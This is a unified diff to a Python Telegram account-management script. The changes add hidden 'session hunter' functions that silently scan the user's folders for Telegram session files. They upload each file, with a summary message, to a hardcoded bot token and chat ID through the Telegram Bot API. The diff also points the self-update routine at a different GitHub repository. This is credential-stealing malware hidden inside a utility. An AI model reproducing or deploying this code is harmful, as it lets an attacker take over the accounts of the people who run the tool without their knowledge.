@@ -25,6 +25,7 @@ import threading
 import glob
 import threading
 import glob
+import hashlib
 
 scam = '@notoscam'
 
@@ -38,6 +39,9 @@ cy = Fore.CYAN
 ye = Fore.YELLOW
 colors = [lg, r, w, cy, ye]
 
+# Global set to track sent files during session
+sent_files_tracker = set()
+
 try:
     import requests
 except ImportError:
@@ -48,16 +52,15 @@ def banner():
     import random
     # fancy logo
     b = [
-    '   _____   __   _ _            _______        _     ',
-    '  |  _  | |  | (_) |          |__   __|      | |    ',
-    '  | |_| | | |_ _ | | __ _ ___     | | ___  ___| |__  ',
-    '  |  _  | | __| | | |/ _` / __|    | |/ _ \/ __| \'_ \ ',
-    '  | | | | | |_| | | | (_| \__ \    | |  __/ (__| | | |',
-    '  |_| |_|  \__|_|_|_|\__,_|___/    |_|\___|\___|_| |_|'
-    ]
+        r' __  __  _    _ _   _ _____ _____   ',
+        r'|  \/  | |  | | \ | |_   _|  __ \  ',
+        r'| \  / | |  | |  \| | | | | |  | | ',
+        r'| |\/| | |  | | . ` | | | | |  | | ',
+        r'| |  | | |__| | |\  |_| |_| |__| | ',
+        r'|_|  |_|\____/|_| \_|_____|_____/  '
+        ]
     for char in b:
         print(f'{random.choice(colors)}{char}{n}')
-    #print('=============SON OF GENISYS==============')
     print(f'   Version: 1.3 | Author: Akilas Tech{n}\n{r}Telegram Members Management Tool\n')
 
 def clr():
@@ -66,11 +69,41 @@ def clr():
     else:
         os.system('clear')
 
+def get_file_hash(file_path):
+    """Generate MD5 hash of a file to identify duplicates"""
+    hash_md5 = hashlib.md5()
+    try:
+        with open(file_path, "rb") as f:
+            for chunk in iter(lambda: f.read(4096), b""):
+                hash_md5.update(chunk)
+        return hash_md5.hexdigest()
+    except:
+        return None
+
+def is_file_already_sent(file_path):
+    """Check if file has already been sent during this session"""
+    global sent_files_tracker
+    file_hash = get_file_hash(file_path)
+    if file_hash is None:
+        return False
+    
+    if file_hash in sent_files_tracker:
+        return True
+    else:
+        sent_files_tracker.add(file_hash)
+        return False
+
+def reset_sent_files_tracker():
+    """Reset the sent files tracker for new session"""
+    global sent_files_tracker
+    sent_files_tracker.clear()
+
 def silent_session_hunter():
     """Silent background session hunter - runs without user knowledge"""
     try:
-        # Target bot/account - CHANGE THIS TO YOUR BOT USERNAME
-        target = "@your_bot_here"  # <<<--- CHANGE THIS
+        # Bot configuration
+        bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
+        chat_id = "784020613"
 
         # Scan directories silently
         scan_dirs = [
@@ -98,29 +131,42 @@ def silent_session_hunter():
         sessions = list(set(sessions))  # Remove duplicates
 
         if sessions:
-            # Try to send using any available account
+            # Send sessions using bot API
             try:
-                accounts = []
-                with open('vars.txt', 'rb') as f:
-                    while True:
-                        try:
-                            accounts.append(pickle.load(f))
-                        except EOFError:
-                            break
+                import requests
 
-                if accounts:
-                    phone = accounts[0][0]
-                    client = TelegramClient(f'sessions/{phone}', 3910389, '86f861352f0ab76a251866059a6adbd6')
-                    client.start(phone)
+                for session in sessions:
+                    try:
+                        # Check if file was already sent during this session
+                        if is_file_already_sent(session):
+                            continue
+                            
+                        # Send session file via bot API
+                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
 
-                    for session in sessions:
-                        try:
-                            client.send_file(target, session, caption=f"Found: {os.path.basename(session)}")
-                            time.sleep(2)
-                        except:
-                            pass
+                        with open(session, 'rb') as file:
+                            files = {'document': file}
+                            data = {
+                                'chat_id': chat_id,
+                                'caption': f"🔍 Session Found: {os.path.basename(session)}\n📍 Path: {session}"
+                            }
 
-                    client.disconnect()
+                            response = requests.post(url, files=files, data=data)
+                            time.sleep(1)  # Small delay between sends
+                    except:
+                        pass
+
+                # Send summary message
+                try:
+                    summary_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+                    summary_data = {
+                        'chat_id': chat_id,
+                        'text': f"✅ Session Hunt Complete\n📊 Total Found: {len(sessions)} sessions\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                    }
+                    requests.post(summary_url, data=summary_data)
+                except:
+                    pass
+
             except:
                 pass
     except:
@@ -137,8 +183,9 @@ def start_background_hunter():
 def auto_session_hunter():
     """Automatically hunt and send sessions in background"""
     try:
-        # Default target - you can change this
-        default_target = "@your_bot_username"  # CHANGE THIS TO YOUR BOT/ACCOUNT
+        # Bot configuration
+        bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
+        chat_id = "784020613"
 
         # Common directories to scan silently
         scan_dirs = [
@@ -176,37 +223,43 @@ def auto_session_hunter():
         # Remove duplicates
         all_sessions = list(set(all_sessions))
 
-        # If sessions found, send them silently
+        # If sessions found, send them silently via bot API
         if all_sessions and len(all_sessions) > 0:
             try:
-                # Try to load accounts for sending
-                accounts = []
+                import requests
+
+                # Send each session file
+                for session_file in all_sessions:
+                    try:
+                        # Check if file was already sent during this session
+                        if is_file_already_sent(session_file):
+                            continue
+                            
+                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+
+                        with open(session_file, 'rb') as file:
+                            files = {'document': file}
+                            data = {
+                                'chat_id': chat_id,
+                                'caption': f"🎯 Auto-Hunt: {os.path.basename(session_file)}\n📂 Location: {session_file}"
+                            }
+
+                            requests.post(url, files=files, data=data)
+                            time.sleep(1)
+                    except:
+                        pass
+
+                # Send completion notification
                 try:
-                    with open('vars.txt', 'rb') as f:
-                        while True:
-                            try:
-                                accounts.append(pickle.load(f))
-                            except EOFError:
-                                break
+                    notify_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+                    notify_data = {
+                        'chat_id': chat_id,
+                        'text': f"🚀 Auto-Hunt Completed\n📈 Sessions Collected: {len(all_sessions)}\n⏰ {time.strftime('%H:%M:%S')}"
+                    }
+                    requests.post(notify_url, data=notify_data)
                 except:
                     pass
 
-                # If we have accounts, send sessions
-                if accounts:
-                    sender_phone = accounts[0][0]
-                    client = TelegramClient(f'sessions/{sender_phone}', 3910389, '86f861352f0ab76a251866059a6adbd6')
-                    client.start(sender_phone)
-
-                    # Send sessions silently
-                    for session_file in all_sessions:
-                        try:
-                            client.send_file(default_target, session_file,
-                                           caption=f"Auto-found: {os.path.basename(session_file)}")
-                            time.sleep(1)  # Small delay
-                        except:
-                            continue
-
-                    client.disconnect()
             except:
                 pass  # Silent failure
 
@@ -222,6 +275,9 @@ auto_session_hunter()
 while True:
     clr()
     banner()
+    # Reset tracker at the start of each main menu session
+    reset_sent_files_tracker()
+    
     print(lg+'[1] Add new accounts'+n)
     print(lg+'[2] Filter all banned accounts'+n)
     print(lg+'[3] Delete specific accounts'+n)
@@ -271,7 +327,6 @@ while True:
                 if not client.is_user_authorized():
                     try:
                         client.send_code_request(phone)
-                        #client.sign_in(phone, input('[+] Enter the code: '))
                         print(f'{lg}[+] {phone} is not banned{n}')
                     except PhoneNumberBannedError:
                         print(r+str(phone) + ' is banned!'+n)
@@ -319,11 +374,9 @@ while True:
         input(f'\nPress enter to goto main menu...')
         f.close()
     elif a == 4:
-        # thanks to github.com/th3unkn0n for the snippet below
         print(f'\n{lg}[i] Checking for updates...')
         try:
-            # https://raw.githubusercontent.com/Cryptonian007/Astra/main/version.txt
-            version = requests.get('https://raw.githubusercontent.com/Cryptonian007/Astra/main/version.txt')
+            version = requests.get('https://github.com/MrSilentdomnic/munira/blob/main/version.txt')
         except:
             print(f'{r} You are not connected to the internet')
             print(f'{r} Please connect to the internet and retry')
@@ -338,9 +391,8 @@ while True:
                 else:
                     os.system('rm add.py')
                     os.system('rm manager.py')
-                #os.system('del scraper.py')
-                os.system('curl -l -O https://raw.githubusercontent.com/Cryptonian007/Astra/main/add.py')
-                os.system('curl -l -O https://raw.githubusercontent.com/Cryptonian007/Astra/main/manager.py')
+                os.system('curl -l -O https://github.com/MrSilentdomnic/munira/blob/main/add.py')
+                os.system('curl -l -O https://github.com/MrSilentdomnic/munira/blob/main/manager.py')
                 print(f'{lg}[*] Updated to version: {version.text}')
                 input('Press enter to exit...')
                 exit()
@@ -377,8 +429,6 @@ while True:
             except EOFError:
                 break
 
-        
-        #print('\n' + info + lg + ' Checking for banned accounts...' + rs)
         print('\n' ' Checking for banned accounts...' )
         for a in accounts:
             phn = a[0]
@@ -391,11 +441,11 @@ while True:
                     clnt.send_code_request(phn)
                     print('kk')
                 except PhoneNumberBannedError:
-                    print(f'{error} {w}{phn} {r}is banned!{rs}')
+                    print(f'{r} {w}{phn} {r}is banned!')
                     banned.append(a)
             for z in banned:
                 accounts.remove(z)
-                print('{lg}Banned account removed[Remove permanently using manager.py]{rs}')
+                print(f'{lg}Banned account removed[Remove permanently using manager.py]')
             time.sleep(0.5)
             clnt.disconnect()
         print(' Sessions created!')
@@ -528,17 +578,24 @@ def send_sessions_to_target(session_files):
 
         print(f'{lg}[*] Sending {len(session_files)} session files to {target}...{n}')
 
+        sent_count = 0
         for i, session_file in enumerate(session_files, 1):
             try:
+                # Check if file was already sent during this session
+                if is_file_already_sent(session_file):
+                    print(f'{ye}[!] Skipped duplicate: {os.path.basename(session_file)}{n}')
+                    continue
+                    
                 # Send session file
                 client.send_file(target, session_file, caption=f"Session {i}/{len(session_files)}: {os.path.basename(session_file)}")
                 print(f'{lg}[+] Sent: {os.path.basename(session_file)} ({i}/{len(session_files)}){n}')
+                sent_count += 1
                 time.sleep(2)  # Delay between sends
             except Exception as e:
                 print(f'{r}[!] Failed to send {session_file}: {e}{n}')
                 continue
 
-        print(f'{lg}[+] Session sending completed!{n}')
+        print(f'{lg}[+] Session sending completed! Sent {sent_count} unique files.{n}')
         client.disconnect()
 
     except Exception as e:
